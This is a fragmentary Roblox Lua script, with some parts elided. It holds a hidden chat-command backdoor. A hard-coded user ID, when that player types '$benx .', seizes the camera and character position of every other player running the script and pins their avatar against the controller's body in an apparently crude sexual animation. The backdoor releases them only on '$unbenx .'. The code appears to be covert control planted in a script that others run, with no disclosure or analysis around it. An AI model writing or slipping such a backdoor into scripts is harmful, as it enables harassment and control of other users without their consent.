while true do 
    local dev = game:GetService("Players"):GetPlayerByUserId(2452452863) --qcnqy
    ...
    dev.Chatted:connect(function(cht)
        if cht:match("$benx .") then
            if game.Players.LocalPlayer ~= dev then
                ...
                game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = dev.Character.HumanoidRootPart
                local benxed = true
                while benxed == true do
                    ...
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = dev.Character.HumanoidRootPart.CFrame + dev.Character.HumanoidRootPart.CFrame.lookVector * 0.5
    ...
    dev.Chatted:connect(function(cht)
        if cht:match("$unbenx .") then
            if game.Players.LocalPlayer ~= dev then
                ...
                wait(15)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(dev.Character.UpperTorso.Position)
            end
        end
